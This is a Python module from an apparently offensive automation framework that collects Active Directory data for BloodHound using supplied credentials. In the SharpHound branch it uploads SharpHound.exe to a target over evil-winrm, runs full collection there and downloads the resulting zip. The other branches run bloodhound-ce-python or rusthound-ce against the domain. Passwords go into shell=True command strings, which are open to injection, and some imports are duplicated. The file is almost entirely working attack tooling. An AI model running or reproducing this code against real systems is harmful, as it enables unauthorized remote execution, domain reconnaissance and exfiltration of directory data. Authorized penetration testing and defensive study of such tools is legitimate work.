import os
import subprocess
from core.paths import get_tool_path

REQUIRES = ["creds"]
PROVIDES = []

def run(data, cred, args):
    method = getattr(args, "method", None)


    if method == "sharphound":
        return run_sharphound(data, cred)

    elif method == "python":
        return run_bloodhound_python(data, cred)

    elif method == "rusthound":
        return run_rusthound(data, cred)

    else:
        print(f"[!] Unsupported method: {method}")
        return data


import os
import subprocess
import re

import os
import re
import subprocess
from core.paths import get_tool_path, get_chain_artifacts_dir


def run_sharphound(data, cred):
    ip = data["ip"]
    target = data["name"]

    user = cred.get("user")
    secret = cred.get("secret")
    cred_type = cred.get("type")

    if cred_type != "password":
        print("[!] sharphound requires password auth")
        return data

    if not user or not secret:
        print("[!] Missing valid credentials")
        return data

    # -------------------
    # Setup
    # -------------------
    local_path = get_tool_path("SharpHound.exe")
    filename = "SharpHound.exe"
    prefix = "bloodhound"

    if not local_path.exists():
        print(f"[!] SharpHound not found: {local_path}")
        return data

    artifact_dir = get_chain_artifacts_dir(target, "bloodhound")

    # -------------------
    # 1. Upload
    # -------------------
    upload_cmd = (
        f'echo "upload {local_path}" | '
        f'evil-winrm -i {ip} -u {user} -p {secret}'
    )

    print("[*] Uploading SharpHound...")
    subprocess.run(upload_cmd, shell=True)

    # -------------------
    # 2. Execute
    # -------------------
    exec_cmd = (
        f'echo ".\\{filename} -c All --outputdirectory . --outputprefix {prefix}" | '
        f'evil-winrm -i {ip} -u {user} -p {secret}'
    )

    print("[*] Running SharpHound...")
    subprocess.run(exec_cmd, shell=True)

    print("[+] Collection complete")

    # -------------------
    # 3. Find ZIP
    # -------------------
    list_cmd = (
        f'echo "dir {prefix}*.zip" | '
        f'evil-winrm -i {ip} -u {user} -p {secret}'
    )

    print("[*] Locating output zip...")
    result = subprocess.run(list_cmd, shell=True, capture_output=True, text=True)

    output = result.stdout
    matches = re.findall(rf"({prefix}.*?\.zip)", output, re.IGNORECASE)

    if not matches:
        print("[!] No BloodHound zip found")
        return data

    zipname = matches[-1]
    print(f"[+] Found zip: {zipname}")

    # -------------------
    # 4. Download (IMPORTANT FIX)
    # -------------------
    download_cmd = (
        f'echo "download {zipname}" | '
        f'evil-winrm -i {ip} -u {user} -p {secret}'
    )

    print(f"[*] Downloading {zipname}...")

    # Force download INTO artifact dir
    subprocess.run(download_cmd, shell=True, cwd=artifact_dir)

    # -------------------
    # 5. Verify
    # -------------------
    dest = artifact_dir / zipname

    if dest.exists():
        print(f"[+] Saved to {dest}")
    else:
        print("[!] Download failed (file not found in artifact dir)")

    return data



# -------------------
# BLOODHOUND PYTHON (local)
# -------------------
def run_bloodhound_python(data, cred):
    target = data["name"]

    user = cred.get("user")
    secret = cred.get("secret")
    domain = data.get("domain")
    dc = data.get("hostname")
    ns = data.get("ip")

    artifact_dir = get_chain_artifacts_dir(target, "bloodhound")

    cmd = (
        f"bloodhound-ce-python --zip -c All "
        f"-d {domain} "
        f"-u {user} -p {secret} "
        f"-dc {dc} "
        f"-ns {ns}"
    )

    print(f"[*] Running: {cmd}")
    subprocess.run(cmd, shell=True)

    # Move all produced zip files
    for file in os.listdir():
        if file.endswith(".zip"):
            os.rename(file, os.path.join(artifact_dir, file))
            print(f"[+] Saved {file} → {artifact_dir}")

    return data


# -------------------
# RUSTHOUND (local)
# -------------------
def run_rusthound(data, cred):
    target = data["name"]

    user = cred.get("user")
    secret = cred.get("secret")
    domain = data.get("domain")

    artifact_dir = get_chain_artifacts_dir(target, "bloodhound")

    cmd = (
        f"rusthound-ce "
        f"-u {user} -p {secret} "
        f"-d {domain} -z"
    )

    print(f"[*] Running: {cmd}")
    subprocess.run(cmd, shell=True)

    # Move output zip(s)
    for file in os.listdir():
        if file.endswith(".zip"):
            os.rename(file, os.path.join(artifact_dir, file))
            print(f"[+] Saved {file} → {artifact_dir}")

    return data




